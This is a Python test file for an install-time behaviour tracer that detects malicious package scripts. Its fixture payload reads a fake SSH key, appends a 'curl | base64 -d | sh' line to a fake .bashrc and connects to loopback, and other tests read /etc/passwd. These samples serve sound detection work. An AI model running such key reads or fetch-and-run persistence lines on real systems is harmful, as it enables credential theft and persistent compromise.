"""M2 acceptance: normalization, process tree, starter rules, terminal report.

Fixture package mimics a malicious install (harmless by design, pointed at
fake files + loopback): reads ~/.ssh/id_ed25519, connects to loopback,
downloads via curl (write-then-exec), touches a shell rc file.
"""

import os
import shutil
import socket
import subprocess
import threading
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
import sys as _sys
if str(ROOT / "src") not in _sys.path:
    _sys.path.insert(0, str(ROOT / "src"))

CANDIDATES = [ROOT / "build" / "tracer" / "trapdoor-trace",
              ROOT / "build" / "trapdoor-trace"]
NPM = shutil.which("npm")


def find_tracer() -> Path:
    env = os.environ.get("TRAPDOOR_TRACE_BIN")
    if env and Path(env).is_file():
        return Path(env)
    for c in CANDIDATES:
        if c.is_file() and os.access(c, os.X_OK):
            return c
    raise AssertionError("trapdoor-trace not built")


def test_normalize_collapses_noise_and_links_tree(tmp_path):
    from trapdoor.analyze import normalize
    from trapdoor.events import Event

    evs = [
        Event(t=0.0, pid=1, ppid=0, exe="/x/npm",
              kind="proc.exec", fields={"argv": ["npm", "install"]}),
        Event(t=0.1, pid=2, ppid=1, exe="/x/node",
              kind="proc.exec", fields={"argv": ["node", "postinstall.js"]}),
        Event(t=0.2, pid=2, ppid=1, exe="/x/node",
              kind="file.open", fields={"path": f"{tmp_path}/node_modules/a/idx.js"}),
        Event(t=0.3, pid=2, ppid=1, exe="/x/node",
              kind="file.open", fields={"path": f"{tmp_path}/node_modules/b/idx.js"}),
        Event(t=0.4, pid=2, ppid=1, exe="/x/node",
              kind="net.connect",
              fields={"addr": "127.0.0.1", "port": 8080, "family": "inet"}),
    ]
    a = normalize(evs, str(tmp_path))
    assert a.findings_by_kind["file.open"] == 2
    # Both node_modules opens collapse: none listed individually.
    assert not any("node_modules" in p for p in a.notable_files)
    # Network endpoint is reported and attributed.
    assert a.network == [("/x/node", "127.0.0.1", "8080")]
    # Tree: npm -> node.
    assert len(a.processes) == 1 and a.processes[0].argv0 == "npm"
    assert a.processes[0].children[0].argv0 == "node"


def test_rules_hit_sensitive_and_network_and_persistence(tmp_path):
    from trapdoor.analyze import Hit
    from trapdoor.events import Event
    from trapdoor.rules import evaluate, load_rules

    home = Path.home()
    evs = [
        Event(t=0.0, pid=5, ppid=0, exe="/bin/sh",
              kind="proc.exec", fields={"argv": ["sh", "install.sh"]}),
        Event(t=0.1, pid=5, ppid=0, exe="/bin/sh",
              kind="file.open",
              fields={"path": str(home / ".ssh" / "id_ed25519"),
                      "flags": "O_RDONLY"}),
        Event(t=0.2, pid=5, ppid=0, exe="/bin/sh",
              kind="net.connect",
              fields={"addr": "127.0.0.1", "port": 9091,
                      "family": "inet"}),
        Event(t=0.3, pid=5, ppid=0, exe="/bin/sh",
              kind="file.open",
              fields={"path": str(home / ".bashrc"),
                      "flags": "O_WRONLY|O_CREAT"}),
        Event(t=0.4, pid=5, ppid=0, exe="/bin/sh",
              kind="proc.exec",
              fields={"argv": ["curl", "-o", "/tmp/x.sh"], "path": "/bin/curl"}),
    ]
    hits = evaluate(evs, load_rules(), str(tmp_path))
    by_rule: dict[str, list[Hit]] = {}
    for h in hits:
        by_rule.setdefault(h.rule_id, []).append(h)
    assert "secret-access" in by_rule
    assert any("id_ed25519" in h.message for h in by_rule["secret-access"])
    assert "unexpected-network" in by_rule
    assert any(h.severity == "low" for h in by_rule["unexpected-network"])
    assert "persistence" in by_rule
    assert "download-tool" in by_rule


def test_write_then_exec_detected(tmp_path):
    from trapdoor.events import Event
    from trapdoor.rules import evaluate, load_rules

    payload = str(tmp_path / "payload.sh")
    evs = [
        Event(t=0.0, pid=7, ppid=0, exe="/bin/node",
              kind="file.open",
              fields={"path": payload, "flags": "O_WRONLY|O_CREAT"}),
        Event(t=0.1, pid=7, ppid=0, exe="/bin/node",
              kind="proc.exec",
              fields={"argv": [payload], "path": payload}),
    ]
    hits = evaluate(evs, load_rules(), str(tmp_path))
    assert any(h.rule_id == "fetch-and-execute" for h in hits), hits


@pytest.mark.skipif(NPM is None, reason="npm not on PATH")
def test_m2_acceptance_fixture_package(tmp_path):
    """Fixture payload (harmless, loopback-only) triggers expected rules.

    npm >= 12 blocks lifecycle scripts for unapproved installs, so the
    payload runs directly in a node process. This still exercises the
    exact behavior under audit: a production install running install-time
    code that touches secrets, the shell rc, and the network.
    """
    fakehome = tmp_path / "fakehome"
    (fakehome / ".ssh").mkdir(parents=True)
    (fakehome / ".ssh" / "id_ed25519").write_text("fake-key-material")
    rc_file = tmp_path / "fakehome" / ".bashrc"
    rc_file.write_text("# before\n")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(2)
    port = srv.getsockname()[1]

    def sink():
        try:
            for _ in range(2):
                c, _ = srv.accept()
                c.close()
        finally:
            srv.close()

    threading.Thread(target=sink, daemon=True).start()

    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "package.json").write_text('{"name":"proj","version":"0.0.0"}')
    env = dict(os.environ,
               HOME=str(fakehome),
               npm_config_cache=str(tmp_path / "npmcache"),
               npm_config_update_notifier="false")

    payload = (
        "const fs=require('fs');"
        f"fs.readFileSync('{fakehome}/.ssh/id_ed25519');"
        f"fs.appendFileSync('{rc_file}','curl L | base64 -d | sh\\n');"
        f"require('net').createConnection({port},'127.0.0.1')"
        ".on('error',()=>{}).end();")
    tracer = find_tracer()
    evf = tmp_path / "events.jsonl"
    proc = subprocess.run(
        [str(tracer), "-o", str(evf), "--", "node", "-e", payload],
        cwd=str(proj), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        timeout=60, env=env)
    assert proc.returncode == 0

    from trapdoor.events import load_events
    from trapdoor.rules import evaluate, load_rules
    evs = load_events(evf)
    # Tracee ran with HOME=fakehome; expand ~ against it, not this shell's.
    hits = evaluate(evs, load_rules(), str(proj), home=str(fakehome))
    by_rule = {}
    for h in hits:
        by_rule.setdefault(h.rule_id, []).append(h)
    # secret-access fires for .ssh/id_ed25519 read
    assert "secret-access" in by_rule, by_rule.keys()
    # persistence fires for .bashrc write (shell rc modification)
    assert "persistence" in by_rule, by_rule.keys()
    assert "unexpected-network" in by_rule, by_rule.keys()

    # Report renders both text and json without corruption.
    from trapdoor.analyze import normalize
    from trapdoor.report import render_json, render_text
    a = normalize(evs, str(proj))
    a.hits = hits
    text = render_text(a, hits)
    data = render_json(a, hits)
    assert "secret-access" in text and "SUSPICIOUS" in text
    assert data["verdict"] == "suspicious" and data["hits"]


def _cli_env() -> dict:
    env = dict(os.environ, TRAPDOOR_TRACE_BIN=str(find_tracer()))
    env["PYTHONPATH"] = str(ROOT / "src") + (
        os.pathsep + env["PYTHONPATH"] if env.get("PYTHONPATH") else "")
    return env


def test_m2_cli_json_report_and_rules_list(tmp_path):
    """`trapdoor run --json` emits parseable JSON; `rules list` enumerates."""
    import json as _json
    env = _cli_env()
    proc = subprocess.run(
        ["python3", "-m", "trapdoor.cli", "run", "--json", "--",
         "python3", "-c", "open('/etc/passwd').read()"],
        capture_output=True, text=True, timeout=60, cwd=str(ROOT), env=env)
    assert proc.returncode == 0, proc.stderr[-2000:]
    data = _json.loads(proc.stdout)
    assert data["verdict"] in ("clean", "suspicious")
    assert sum(data["event_counts"].values()) > 0
    assert isinstance(data["hits"], list)

    lst = subprocess.run(
        ["python3", "-m", "trapdoor.cli", "rules", "list"],
        capture_output=True, text=True, timeout=30, cwd=str(ROOT), env=env)
    assert lst.returncode == 0, lst.stderr[-1000:]
    for rid in ("secret-access", "unexpected-network", "persistence"):
        assert rid in lst.stdout


def test_m2_cli_traced_failure_propagates(tmp_path):
    """A failing traced command must yield its exit code, not 0."""
    env = _cli_env()
    proc = subprocess.run(
        ["python3", "-m", "trapdoor.cli", "run", "--", "python3", "-c",
         "raise SystemExit(7)"],
        capture_output=True, text=True, timeout=60, cwd=str(ROOT), env=env)
    assert proc.returncode == 7, (proc.returncode, proc.stderr[-1000:])


def test_registry_allowlist_forward_resolved_ips(tmp_path):
    """Network rule suppresses hits for forward-resolved registry IPs.

    Offline test: evaluate() receives allowed_ips directly without making
    DNS queries. An event connecting to an IP in allowed_ips must produce
    no hit; an event connecting to an IP outside it must produce an
    unexpected-network hit.
    """
    from trapdoor.events import Event
    from trapdoor.rules import evaluate, load_rules

    allowed_ip = "104.16.3.34"   # Simulated forward-resolved registry IP
    unknown_ip = "198.51.100.1"  # TEST-NET-3 IP outside allowlist

    evs = [
        Event(t=0.1, pid=10, ppid=0, exe="/bin/node",
              kind="net.connect",
              fields={"addr": allowed_ip, "port": 443, "family": "inet"}),
        Event(t=0.2, pid=10, ppid=0, exe="/bin/node",
              kind="net.connect",
              fields={"addr": unknown_ip, "port": 8080, "family": "inet"}),
    ]

    rules = load_rules()
    # With allowed_ips: allowed_ip produces NO hit; unknown_ip produces a hit.
    hits = evaluate(evs, rules, str(tmp_path), allowed_ips={allowed_ip})
    net_hits = [h for h in hits if h.rule_id == "unexpected-network"]
    assert len(net_hits) == 1, f"expected 1 hit for unknown IP, got {net_hits}"
    assert unknown_ip in net_hits[0].message
    assert allowed_ip not in net_hits[0].message
    assert net_hits[0].severity == "medium"

    # Without allowed_ips: both external IPs trigger unexpected-network hits.
    hits_no_allow = evaluate(evs, rules, str(tmp_path))
    net_hits_no_allow = [h for h in hits_no_allow if h.rule_id == "unexpected-network"]
    assert len(net_hits_no_allow) == 2

    # Loopback still gets low severity, not suppressed like registry IPs.
    loop_ev = [Event(t=0.3, pid=10, ppid=0, exe="/bin/node",
                     kind="net.connect",
                     fields={"addr": "127.0.0.1", "port": 9000, "family": "inet"})]
    loop_hits = evaluate(loop_ev, rules, str(tmp_path), allowed_ips={allowed_ip})
    assert len(loop_hits) == 1
    assert loop_hits[0].severity == "low"


def test_registry_allowlist_dns_failure_warning(tmp_path):
    """When DNS resolution fails, reports include a prominent warning."""
    from trapdoor.analyze import normalize
    from trapdoor.report import render_json, render_text

    a = normalize([], str(tmp_path))
    a.warnings.append("registry allowlist was unavailable: DNS resolution failed")

    text = render_text(a, [])
    assert "warnings" in text
    assert "registry allowlist was unavailable: DNS resolution failed" in text

    data = render_json(a, [])
    assert "warnings" in data
    assert any("DNS resolution failed" in w for w in data["warnings"])


def test_cli_lazy_dns_resolution_and_injection(tmp_path, monkeypatch):
    """CLI skips DNS when trace has no external network, and supports injected IPs."""
    from trapdoor.cli import cmd_run

    def _exploding_resolver():
        raise AssertionError("resolve_allowed_hosts must not be called when trace has no external network")

    monkeypatch.setattr("trapdoor.cli.resolve_allowed_hosts", _exploding_resolver)

    out_file = tmp_path / "events.jsonl"
    rc = cmd_run(["--", "python3", "-c", "open('/etc/passwd').read()"],
                 output=str(out_file), as_json=True, keep_events=False)
    assert rc == 0


def test_resolve_allowed_hosts_timeout_bounds_execution(monkeypatch):
    """Hung or slow getaddrinfo calls must be strictly bounded by timeout."""
    import time
    from trapdoor.rules import REGULAR_HOSTS, resolve_allowed_hosts

    def _slow_getaddrinfo(*args, **kwargs):
        time.sleep(10.0)
        return []

    monkeypatch.setattr("socket.getaddrinfo", _slow_getaddrinfo)

    t0 = time.monotonic()
    ips, failed = resolve_allowed_hosts(timeout=1.0)
    elapsed = time.monotonic() - t0

    assert elapsed < 2.5, f"expected timeout ~1.0s, took {elapsed:.2f}s"
    assert ips == set()
    assert set(failed) == set(REGULAR_HOSTS)


def test_cli_allow_ip_override_warning(tmp_path, monkeypatch, capsys):
    """When --allow-ip is used, report prominently flags the override."""
    import json as _json
    from trapdoor.cli import cmd_run

    out_file = tmp_path / "events.jsonl"
    rc = cmd_run(["--", "python3", "-c", "open('/etc/passwd').read()"],
                 output=str(out_file), as_json=True, keep_events=False,
                 allow_ips=["198.51.100.1"])
    assert rc == 0
    captured = capsys.readouterr()
    data = _json.loads(captured.out)
    assert "warnings" in data
    assert any("allowlist override active" in w and "198.51.100.1" in w for w in data["warnings"])


def test_external_write_under_fakehome_not_swallowed_by_tmp_exemption():
    """Hermetic test: /tmp exemption must not swallow writes under home in /tmp.

    Synthetic events only (no tracer, no real temp dirs).
    With home="/tmp/x/fakehome" and project="/tmp/x/project":
    - A write to /tmp/x/fakehome/.bashrc must produce write-outside-project.
    - A write to /tmp/npm-123/cache must not produce write-outside-project.
    """
    from trapdoor.events import Event
    from trapdoor.rules import evaluate, load_rules

    rules = load_rules()
    fake_home = "/tmp/x/fakehome"
    project_dir = "/tmp/x/project"

    # 1. Write to fake home .bashrc -> must trigger write-outside-project (and persistence)
    ev_home = [
        Event(t=0.1, pid=10, ppid=0, exe="/bin/node", kind="file.open",
              fields={"path": f"{fake_home}/.bashrc", "flags": "O_WRONLY|O_CREAT"}),
    ]
    hits_home = evaluate(ev_home, rules, project=project_dir, home=fake_home)
    rule_ids_home = {h.rule_id for h in hits_home}
    assert "write-outside-project" in rule_ids_home
    assert "persistence" in rule_ids_home

    # 2. Ephemeral build scratch write in /tmp -> exempted by ignore_prefixes
    ev_scratch = [
        Event(t=0.2, pid=10, ppid=0, exe="/bin/node", kind="file.open",
              fields={"path": "/tmp/npm-123/cache", "flags": "O_WRONLY|O_CREAT"}),
    ]
    hits_scratch = evaluate(ev_scratch, rules, project=project_dir, home=fake_home)
    rule_ids_scratch = {h.rule_id for h in hits_scratch}
    assert "write-outside-project" not in rule_ids_scratch


